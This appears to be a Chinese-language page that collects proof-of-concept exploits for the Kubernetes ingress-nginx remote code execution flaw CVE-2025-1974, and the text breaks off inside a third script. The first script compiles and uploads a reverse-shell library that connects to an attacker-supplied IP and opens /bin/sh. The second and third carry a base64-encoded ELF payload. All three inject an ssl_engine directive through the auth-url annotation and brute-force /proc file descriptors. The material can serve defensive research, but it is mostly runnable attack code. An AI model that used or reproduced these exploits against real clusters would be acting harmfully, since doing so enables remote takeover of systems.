## KUBERNETES INGRESS-NGINX远程代码执行漏洞(CVE-2025-1974)

## poc1
```python
#!/usr/bin/env python3
import asyncio
import json
import os
import subprocess
import tempfile
import argparse
from pathlib import Path
import sys
import httpx

# Default shellcode for reverse shell
DEFAULT_SHELL_C = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

__attribute__((constructor))
void init(void) {
    if (fork() == 0) {
        // Create socket
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(REVERSE_SHELL_PORT);
        addr.sin_addr.s_addr = inet_addr("REVERSE_SHELL_IP");

        connect(sock, (struct sockaddr *)&addr, sizeof(addr));

        // Redirect stdin, stdout, stderr
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        // Execute shell
        execve("/bin/sh", NULL, NULL);
    }
}
"""

data_req = json.loads("""
                  {
  "kind": "AdmissionReview",
  "apiVersion": "admission.k8s.io/v1",
  "request": {
    "uid": "85b707bf-4241-4f9b-9ee8-7809c7132cdc",
    "kind": {
      "group": "networking.k8s.io",
      "version": "v1",
      "kind": "Ingress"
    },
    "resource": {
      "group": "networking.k8s.io",
      "version": "v1",
      "resource": "ingresses"
    },
    "requestKind": {
      "group": "networking.k8s.io",
      "version": "v1",
      "kind": "Ingress"
    },
    "requestResource": {
      "group": "networking.k8s.io",
      "version": "v1",
      "resource": "ingresses"
    },
    "name": "xxx",
    "namespace": "default",
    "operation": "CREATE",
    "userInfo": {
      "username": "kube-review",
      "uid": "60a7a2da-f9ec-4afc-baaa-11bf648233a8"
    },
    "object": {
      "kind": "Ingress",
      "apiVersion": "networking.k8s.io/v1",
      "metadata": {
        "name": "xxx",
        "namespace": "default",
        "creationTimestamp": null,
        "annotations": {
          "nginx.ingress.kubernetes.io/auth-url": "xxx"
        }
      },
      "spec": {
        "ingressClassName": "nginx",
        "rules": [
          {
            "host": "xxx.example.com",
            "http": {
              "paths": [
                {
                  "path": "/",
                  "pathType": "Prefix",
                  "backend": {
                    "service": {
                      "name": "xxx",
                      "port": {
                        "number": 5244
                      }
                    }
                  }
                }
              ]
            }
          }
        ]
      },
      "status": {
        "loadBalancer": {}
      }
    },
    "oldObject": null,
    "dryRun": true,
    "options": {
      "kind": "CreateOptions",
      "apiVersion": "meta.k8s.io/v1"
    }
  }
}
""")


class Exploit:
    def __init__(self, local_mode: bool = False, reverse_shell_ip: str = "10.0.0.1", 
                 reverse_shell_port: int = 4444, admission_port: int = 8443, ingress_port: int = 8080):
        """
        Initialize the exploit.
        
        Args:
            local_mode: Whether to use port-forwarded local connections
            reverse_shell_ip: IP for the reverse shell to connect back to
            reverse_shell_port: Port for the reverse shell to connect back to
            admission_port: Local port for admission controller (for local_mode)
            ingress_port: Local port for ingress controller (for local_mode)
        """
        self.reverse_shell_ip = reverse_shell_ip
        self.reverse_shell_port = reverse_shell_port
        
        if local_mode:
            self.admission_url = f"https://localhost:{admission_port}/networking/v1/ingresses"
            self.target_url = f"http://localhost:{ingress_port}/fake/addr"
        else:
            self.admission_url = "https://ingress-nginx-controller-admission.ingress-nginx.svc:443/networking/v1/ingresses"
            self.target_url = "http://ingress-nginx-controller.ingress-nginx.svc/fake/addr"
            
        self.req_data = data_req
        
    def build_shellcode(self) -> str:
        """
        Build the shellcode from C to .so
        
        Returns:
            Path to the compiled shellcode .so file
        """
        print("[+] Building shellcode...")
        
        # Create temporary directory
        temp_dir = tempfile.mkdtemp()
        shell_c_path = os.path.join(temp_dir, "shell.c")
        shell_so_path = os.path.join(temp_dir, "shell.so")
        
        # Replace IP and port in the shellcode template
        shell_c_content = DEFAULT_SHELL_C.replace("REVERSE_SHELL_IP", self.reverse_shell_ip)
        shell_c_content = shell_c_content.replace("REVERSE_SHELL_PORT", str(self.reverse_shell_port))
        
        # Write the C file
        with open(shell_c_path, "w") as f:
            f.write(shell_c_content)
        
        # Build using Docker
        docker_cmd = [
            "docker", "run", "--rm", "--platform", "linux/amd64",
            "-v", f"{temp_dir}:/build", "alpine:latest", 
            "/bin/sh", "-c", 
            "cd /build && "
            "apk update && "
            "apk add musl-dev build-base && "
            "gcc shell.c -S -o shell.S && "
            "as --64 -o shell.o shell.S && "
            "ld -shared -nostdlib -z noseparate-code -z max-page-size=0x1000 -o shell.so shell.o && "
            "strip --strip-all shell.so && "
            "chmod +x shell.so && "
            "truncate -s 10240 shell.so"
        ]
        
        try:
            print("[*] Building shellcode with Docker...")
            subprocess.run(docker_cmd, check=True)
            print(f"[+] Shellcode built successfully at {shell_so_path}")
            
            with open(shell_so_path, "rb") as f:
                self.shellcode = f.read()
            
            return shell_so_path
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to build shellcode with Docker: {e}")
            print("[!] Attempting to build locally...")
            
            # Try to build locally if Docker fails
            try:
                subprocess.run(["gcc", "-shared", "-fPIC", shell_c_path, "-o", shell_so_path], check=True)
                print(f"[+] Shellcode built locally at {shell_so_path}")
                
                with open(shell_so_path, "rb") as f:
                    self.shellcode = f.read()
                
                return shell_so_path
            except subprocess.CalledProcessError as e:
                print(f"[!] Local build failed: {e}")
                raise RuntimeError("Failed to build shellcode")

    async def send_admission_req(self) -> None:
        print("[+] Searching for vulnerable file descriptors...")
        async with httpx.AsyncClient(verify=False) as client:
            for pid in range(1, 400):
                for fd in range(1, 200):
                    proc_path = f"/proc/{pid}/fd/{fd}"
                    self.req_data["request"]["object"]["metadata"]["annotations"][
                        "nginx.ingress.kubernetes.io/auth-url"
                    ] = "http://example.com/#;}}}\n\nssl_engine %s;\n\n" % (proc_path,)
                    try:
                        print(f"[*] Testing {proc_path}")
                        resp = await client.post(
                            self.admission_url,
                            json=self.req_data,
                        )
                        res = resp.json()["response"]
                        print(f"[*] Response: {res}")
                        if "No such device or address" in res["status"]["message"] or (
                            "No such file or directory" in res["status"]["message"]
                        ): 
                            continue
                    except Exception as e:
                        print(f"[!] Error: {e}")
                        continue
                    print(f"[+] Found vulnerable file descriptor: {proc_path}")
                    return

    async def upload_shellcode(self) -> None:
        """Upload shellcode through HTTP request"""
        
        class FakeIterator:
            """Async iterator that yields shellcode once then holds connection"""
            def __init__(self, shellcode):
                self.shellcode = shellcode
                self.sent = False

            async def __aiter__(self):
                yield self.shellcode
                await asyncio.sleep(60*60) 

        print(f"[+] Uploading shellcode ({len(self.shellcode)} bytes)")
        
        headers = {
            "Content-Type": "application/octet-stream",
            "Content-Length": str(len(self.shellcode) * 50),
        }
        
        async with httpx.AsyncClient() as client:
            try:
                await client.post(
                    self.target_url,
                    data=FakeIterator(self.shellcode),
                    headers=headers,
                    timeout=None
                )
            except Exception as e:
                print(f"[*] Upload connection status: {e}")

    async def run_exploit(self) -> None:
        """Run the complete exploit chain"""
        print("[+] Starting CVE-2025-1974 exploit...")
        print(f"[*] Reverse shell will connect to {self.reverse_shell_ip}:{self.reverse_shell_port}")
        print("[*] Make sure you have a listener running (e.g., nc -lvnp 4444)")
        self.build_shellcode()

        upload_tasks = [self.upload_shellcode() for _ in range(50)]
        admission_task = self.send_admission_req()
        await asyncio.gather(*upload_tasks, admission_task)
        print("[+] Exploit completed. Check your listener for incoming connection.")


async def main():
    parser = argparse.ArgumentParser(description="CVE-2025-1974 Ingress Nginx Controller Exploit")
    parser.add_argument("--local", action="store_true", help="Use local port-forwarded connection")
    parser.add_argument("--ip", required=True, help="IP for reverse shell connection")
    parser.add_argument("--port", type=int, default=4444, help="Port for reverse shell connection")
    parser.add_argument("--admission-port", type=int, default=8443, help="Local port for admission controller")
    parser.add_argument("--ingress-port", type=int, default=8080, help="Local port for ingress controller")
    
    args = parser.parse_args()
    
    if not args.ip:
        print("[!] Error: You must specify an IP address with --ip")
        sys.exit(1)
    
    exploit = Exploit(
        local_mode=args.local,
        reverse_shell_ip=args.ip,
        reverse_shell_port=args.port,
        admission_port=args.admission_port,
        ingress_port=args.ingress_port
    )
    
    await exploit.run_exploit()


if __name__ == "__main__":
    import warnings
    warnings.filterwarnings("ignore")
    
    asyncio.run(main())
```
原作者地址:https://github.com/zwxxb/CVE-2025-1974/blob/main/poc.py
## poc2
```python
import base64
import time

import requests
import sys
from urllib.parse import urlparse
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3
import socket

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

pwn_base64 = "f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAAAAAAAAAAABAAAAAAAAAANAQAAAAAAAAAAAAAEAAOAAHAEAAEAAPAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAMAAAAAAACgAwAAAAAAAAAQAAAAAAAAAQAAAAYAAACgDgAAAAAAAKAeAAAAAAAAoB4AAAAAAABwAQAAAAAAAHABAAAAAAAAABAAAAAAAAACAAAABgAAAKgOAAAAAAAAqB4AAAAAAACoHgAAAAAAAEABAAAAAAAAQAEAAAAAAAAIAAAAAAAAAAQAAAAEAAAAcAMAAAAAAABwAwAAAAAAAHADAAAAAAAAMAAAAAAAAAAwAAAAAAAAAAgAAAAAAAAAU+V0ZAQAAABwAwAAAAAAAHADAAAAAAAAcAMAAAAAAAAwAAAAAAAAADAAAAAAAAAACAAAAAAAAABR5XRkBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAFLldGQEAAAAoA4AAAAAAACgHgAAAAAAAKAeAAAAAAAAYAEAAAAAAABgAQAAAAAAAAEAAAAAAAAAAQAAAAEAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAdW5zZXRlbnYAc3lzdGVtAAAAAAAAAACgHgAAAAAAAAgAAAAAAAAAwAIAAAAAAAAAIAAAAAAAAAcAAAABAAAAAAAAAAAAAAAIIAAAAAAAAAcAAAACAAAAAAAAAAAAAAD/NVodAAD/JVwdAAAPH0AA/yVaHQAAaAAAAADp4P////8lUh0AAGgBAAAA6dD///9VSInlSI0FGgAAAEiJx+jN////SI0FFgAAAEiJx+jO////kF3DTERfUFJFTE9BRABzaCAtYyAndG91Y2ggL3RtcC9sdWZlaV9va2snAAAAABQAAAAAAAAAAXpSAAF4EAEbDAcIkAEAABwAAAAcAAAAkP///yUAAAAAQQ4QhgJDDQZgDAcIAAAAIAAAADwAAABA////MAAAAAAOEEYOGEoPC3cIgAA/GjsqMyQiAAAAAAQAAAAgAAAABQAAAEdOVQABAAHABAAAAAEAAAAAAAAAAgABwAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAIAAAAAAAAZAAAAAAAAAKAeAAAAAAAAGwAAAAAAAAAIAAAAAAAAAPX+/28AAAAAyAEAAAAAAAAFAAAAAAAAADACAAAAAAAABgAAAAAAAADoAQAAAAAAAAoAAAAAAAAAEQAAAAAAAAALAAAAAAAAABgAAAAAAAAAAwAAAAAAAADoHwAAAAAAAAIAAAAAAAAAMAAAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAAAAAAAABgAgAAAAAAAAcAAAAAAAAASAIAAAAAAAAIAAAAAAAAABgAAAAAAAAACQAAAAAAAAAYAAAAAAAAAPn//28AAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKgeAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKYCAAAAAAAAtgIAAAAAAABHQ0M6IChBbHBpbmUgMTMuMi4xX2dpdDIwMjQwMzA5KSAxMy4yLjEgMjAyNDAzMDkAAC5zaHN0cnRhYgAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5yZWxhLmR5bgAucmVsYS5wbHQALnRleHQALnJvZGF0YQAuZWhfZnJhbWUALm5vdGUuZ251LnByb3BlcnR5AC5pbml0X2FycmF5AC5keW5hbWljAC5nb3QucGx0AC5jb21tZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAPb//28CAAAAAAAAAMgBAAAAAAAAyAEAAAAAAAAcAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAAAAAAAAAABUAAAALAAAAAgAAAAAAAADoAQAAAAAAAOgBAAAAAAAASAAAAAAAAAADAAAAAQAAAAgAAAAAAAAAGAAAAAAAAAAdAAAAAwAAAAIAAAAAAAAAMAIAAAAAAAAwAgAAAAAAABEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAJQAAAAQAAAACAAAAAAAAAEgCAAAAAAAASAIAAAAAAAAYAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAYAAAAAAAAAC8AAAAEAAAAQgAAAAAAAABgAgAAAAAAAGACAAAAAAAAMAAAAAAAAAACAAAADQAAAAgAAAAAAAAAGAAAAAAAAAA0AAAAAQAAAAYAAAAAAAAAkAIAAAAAAACQAgAAAAAAADAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAOQAAAAEAAAAGAAAAAAAAAMACAAAAAAAAwAIAAAAAAAAlAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAD8AAAABAAAAAgAAAAAAAADlAgAAAAAAAOUCAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABHAAAAAQAAAAIAAAAAAAAAEAMAAAAAAAAQAwAAAAAAAFwAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAUQAAAAcAAAACAAAAAAAAAHADAAAAAAAAcAMAAAAAAAAwAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAGQAAAAOAAAAAwAAAAAAAACgHgAAAAAAAKAOAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAABwAAAABgAAAAMAAAAAAAAAqB4AAAAAAACoDgAAAAAAAEABAAAAAAAAAwAAAAAAAAAIAAAAAAAAABAAAAAAAAAAeQAAAAEAAAADAAAAAAAAAOgfAAAAAAAA6A8AAAAAAAAoAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAIIAAAABAAAAMAAAAAAAAAAAAAAAAAAAABAQAAAAAAAAMQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAwAAAAAAAAAAAAAAAAAAAAAAAABBEAAAAAAAAIsAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA"

admssion_json = """
{
   "kind": "AdmissionReview",
   "apiVersion": "admission.k8s.io/v1",
   "request": {
      "uid": "3babc164-2b11-4c9c-976a-52f477c63e35",
      "kind": {
         "group": "networking.k8s.io",
         "version": "v1",
         "kind": "Ingress"
      },
      "resource": {
         "group": "networking.k8s.io",
         "version": "v1",
         "resource": "ingresses"
      },
      "requestKind": {
         "group": "networking.k8s.io",
         "version": "v1",
         "kind": "Ingress"
      },
      "requestResource": {
         "group": "networking.k8s.io",
         "version": "v1",
         "resource": "ingresses"
      },
      "name": "minimal-ingress",
      "namespace": "default",
      "operation": "CREATE",
      "userInfo": {
         "uid": "1619bf32-d4cb-4a99-a4a4-d33b2efa3bc6"
      },
      "object": {
         "kind": "Ingress",
         "apiVersion": "networking.k8s.io/v1",
         "metadata": {
            "name": "minimal-ingress",
            "namespace": "default",
            "creationTimestamp": null,
            "annotations": {
                "nginx.ingress.kubernetes.io/auth-url": "http://example.com/#;}}}\\n\\nssl_engine ../../../../../../../REPLACE\\n\\n"
            }
         },
         "spec": {
            "ingressClassName": "nginx",
            "rules": [
               {
                  "host": "test.example.com",
                  "http": {
                     "paths": [
                        {
                           "path": "/",
                           "pathType": "Prefix",
                           "backend": {
                              "service": {
                                 "name": "kubernetes",
                                 "port": {
                                    "number": 443
                                 }
                              }
                           }
                        }
                     ]
                  }
               }
            ]
         },
         "status": {
            "loadBalancer": {}
         }
      },
      "oldObject": null,
      "dryRun": true,
      "options": {
         "kind": "CreateOptions",
         "apiVersion": "meta.k8s.io/v1"
      }
   }
}
"""


def send_request(admission_url, json_data, proc, fd):
    print(f"Trying Proc: {proc}, FD: {fd}")
    path = f"proc/{proc}/fd/{fd}"
    replaced_data = json_data.replace("REPLACE", path)

    headers = {
        "Content-Type": "application/json"
    }

    full_url = admission_url.rstrip("/") + "/admission"

    try:
        response = requests.post(full_url, data=replaced_data, headers=headers, verify=False, timeout=1)
        # print(response.text) - use this to debug (check response of admission webhook)
        print(f"Response for /proc/{proc}/fd/{fd}: {response.status_code}")
    except Exception as e:
        print(f"Error on /proc/{proc}/fd/{fd}: {e}")


def admission_brute(admission_url, max_workers=10):
    # proc = input("INPUT PROC:") - use this for manual testing
    # fd = input("INPUT FD:") - use this for manual testing
    # send_request(admission_url, json_data, proc, fd) - use this for manual testing

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        for proc in range(30, 50):  # can be increased to 100
            for fd in range(3, 30):  # can be increased to 100 (not recommended)
                executor.submit(send_request, admission_url, admssion_json, proc, fd)

        for proc in range(160, 180):  # can be increased to 100
            for fd in range(3, 30):  # can be increased to 100 (not recommended)
                executor.submit(send_request, admission_url, admssion_json, proc, fd)


def exploit(ingress_url):
    so = base64.b64decode(pwn_base64) + b"\00" * 8092

    real_length = len(so)
    fake_length = real_length + 10
    url = ingress_url

    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or 80
    path = parsed.path or "/"

    try:
        sock = socket.create_connection((host, port))
    except Exception as e:
        print(f"Error connecting to {host}:{port}: {e} - host is up?")
        sys.exit(0)
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: lufeisec\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Length: {fake_length}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode("iso-8859-1")

    http_payload = headers + so
    sock.sendall(http_payload)

    response = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk

    print("[*] Resposta:")
    print(response.decode(errors="ignore"))

    sock.close()


if len(sys.argv) < 2:
    print("Usage: python3 exploit.py <ingress_url> <admission_webhook_url> ")
    sys.exit(0)
else:
    ingress_url = sys.argv[1]
    admission = sys.argv[2]

    # Send the library to the ingress pod and keep the connection open to keep the file open via the file descriptor (FD).
    x = threading.Thread(target=exploit, args=(ingress_url,))
    x.start()

    # time.sleep(9999 * 9999)
    # start the admission webhook brute force (/proc/{pid}/fd/{fd})
    admission_brute(admission)
```
## poc3
```python
import base64
import time

import requests
import sys
from urllib.parse import urlparse
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3
import socket

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

pwn_base64 = "f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAAAAAAAAAAABAAAAAAAAAANAQAAAAAAAAAAAAAEAAOAAHAEAAEAAPAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAMAAAAAAACgAwAAAAAAAAAQAAAAAAAAAQAAAAYAAACgDgAAAAAAAKAeAAAAAAAAoB4AAAAAAABwAQAAAAAAAHABAAAAAAAAABAAAAAAAAACAAAABgAAAKgOAAAAAAAAqB4AAAAAAACoHgAAAAAAAEABAAAAAAAAQAEAAAAAAAAIAAAAAAAAAAQAAAAEAAAAcAMAAAAAAABwAwAAAAAAAHADAAAAAAAAMAAAAAAAAAAwAAAAAAAAAAgAAAAAAAAAU+V0ZAQAAABwAwAAAAAAAHADAAAAAAAAcAMAAAAAAAAwAAAAAAAAADAAAAAAAAAACAAAAAAAAABR5XRkBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAFLldGQEAAAAoA4AAAAAAACgHgAAAAAAAKAeAAAAAAAAYAEAAAAAAABgAQAAAAAAAAEAAAAAAAAAAQAAAAEAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAdW5zZXRlbnYAc3lzdGVtAAAAAAAAAACgHgAAAAAAAAgAAAAAAAAAwAIAAAAAAAAAIAAAAAAAAAcAAAABAAAAAAAAAAAAAAAIIAAAAAAAAAcAAAACAAAAAAAAAAAAAAD/NVodAAD/JVwdAAAPH0AA/yVaHQAAaAAAAADp4P////8lUh0AAGgBAAAA6dD///9VSInlSI0FGgAAAEiJx+jN////SI0FFgAAAEiJx+jO////kF3DTERfUFJFTE9BRABzaCAtYyAndG91Y2ggL3RtcC9sdWZlaV9va2snAAAAABQAAAAAAAAAAXpSAAF4EAEbDAcIkAEAABwAAAAcAAAAkP///yUAAAAAQQ4QhgJDDQZgDAcIAAAAIAAAADwAAABA////MAAAAAAOEEYOGEoPC3cIgAA/GjsqMyQiAAAAAAQAAAAgAAAABQAAAEdOVQABAAHABAAAAAEAAAAAAAAAAgABwAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA